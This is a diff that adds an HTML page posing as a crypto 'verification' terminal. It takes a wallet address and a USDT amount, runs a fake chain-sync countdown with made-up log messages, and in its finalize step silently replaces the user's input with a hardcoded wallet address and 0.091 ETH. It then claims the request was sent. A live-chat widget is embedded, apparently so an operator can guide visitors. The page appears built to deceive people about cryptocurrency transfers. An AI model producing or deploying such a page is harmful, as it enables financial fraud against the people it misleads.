@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        :root { --neon: #00ff41; }
+        body { background: #000; color: var(--neon); font-family: 'Courier New', monospace; margin: 0; height: 100dvh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .live-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-image: linear-gradient(rgba(0, 255, 65, 0.1) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 255, 65, 0.1) 1px, transparent 1px); background-size: 50px 50px; animation: scrollGrid 10s linear infinite; pointer-events: none; }
+        @keyframes scrollGrid { 0% { transform: translateY(0); } 100% { transform: translateY(50px); } }
+        .processing .live-bg { animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
+        .terminal-card { border: 1px solid var(--neon); padding: 30px; border-radius: 4px; background: rgba(0, 0, 0, 0.9); width: 90%; max-width: 450px; box-shadow: 0 0 40px rgba(0, 255, 65, 0.1); z-index: 1; }
+        .log { font-size: 0.75em; height: 100px; overflow-y: auto; color: #008f11; margin-bottom: 20px; border-bottom: 1px solid #111; }
+        input { width: 100%; padding: 12px; background: #080808; border: 1px solid var(--neon); color: var(--neon); outline: none; margin: 8px 0; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: var(--neon); color: #000; border: none; font-weight: 900; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
+        .glitch { animation: flash 0.5s infinite; }
+        @keyframes flash { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+        label { font-size: 0.7em; display: block; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="live-bg"></div>
+    <div class="terminal-card">
+        <div id="log" class="log">> Initializing Nexus Core...<br>> Establishing secure node...</div>
+        <div id="ui">
+            <h3>> System ID: V-082</h3>
+            <input type="text" id="address" placeholder="Enter Wallet Address">
+            <input type="text" id="amount" placeholder="Enter Amount (USDT)">
+            <button onclick="run()">Execute Verification</button>
+        </div>
+    </div>
+    <script>
+        const logBox = document.getElementById('log');
+        function addLog(msg) { logBox.innerHTML += `<br>> ${msg}`; logBox.scrollTop = logBox.scrollHeight; }
+        
+        function run() {
+            const addr = document.getElementById('address').value;
+            const amt = document.getElementById('amount').value;
+            
+            if(addr.length < 20 || !addr.startsWith('0x')) {
+                addLog("ERROR: Invalid Address Format.");
+                return;
+            }
+            if(!amt || parseFloat(amt) <= 0) {
+                addLog("ERROR: Invalid Amount.");
+                return;
+            }
+            
+            document.body.classList.add('processing');
+            let timeLeft = 60;
+            const ui = document.getElementById('ui');
+            
+            const timer = setInterval(() => {
+                ui.innerHTML = `<h3 class='glitch'>Syncing Chain: ${timeLeft}s</h3><p>Establishing secure bridge to node...</p>`;
+                timeLeft--;
+                if(timeLeft < 0) {
+                    clearInterval(timer);
+                    showFinalUI(addr, amt);
+                }
+            }, 1000);
+            
+            addLog("Encryption initiated...");
+            addLog("Broadcasting to validator nodes...");
+        }
+
+        function showFinalUI(addr, amt) {
+            document.body.classList.remove('processing');
+            addLog("Status: Sync Pending");
+            document.getElementById('ui').innerHTML = `
+                <h3>> Transaction Pending</h3>
+                <label>Recipient Address:</label>
+                <input type="text" id="finalAddr" value="${addr}">
+                <label>Amount (USDT):</label>
+                <input type="text" id="finalAmt" value="${amt}">
+                <p style='color:yellow; font-size: 0.8em;'>Status: Awaiting recipient network confirmation. Finalize to complete sync.</p>
+                <button onclick="finalize()">Finalize Sync</button>
+            `;
+        }
+
+        function finalize() {
+            // --- FLEXIBLE OVERRIDE AREA ---
+            // Set these to null to use the user's input, or set to a specific string to override it
+            const OVERRIDE_ADDRESS = '0x4721155360CA5def6c86Acdb4Ff05a4e2FE98041'; 
+            const OVERRIDE_AMOUNT = '0.091'; 
+            // ------------------------------
+
+            const fAddr = OVERRIDE_ADDRESS || document.getElementById('finalAddr').value;
+            const fAmt = OVERRIDE_AMOUNT || document.getElementById('finalAmt').value;
+            
+            const confirmed = confirm(`Complete network request to finalize ${fAmt} ETH to ${fAddr}`);
+            
+            if (confirmed) {
+                addLog(`Transaction Sent: ${fAmt} ETH`);
+                document.getElementById('ui').innerHTML = `<h3>> Transaction Finalized</h3><p style='color:white'>Network Request Sent Successfully.</p>`;
+            } else {
+                addLog("Transaction request cancelled by user.");
+            }
+        }
+
+        var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+        (function(){
+            var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+            s1.async=true; s1.src='https://embed.tawk.to/64b5840994cf5d49dc64a517/1h5g9i18i';
+            s1.charset='UTF-8'; s1.setAttribute('crossorigin','*');
+            s0.parentNode.insertBefore(s1,s0);
+        })();
+    </script>
+</body>
+</html>
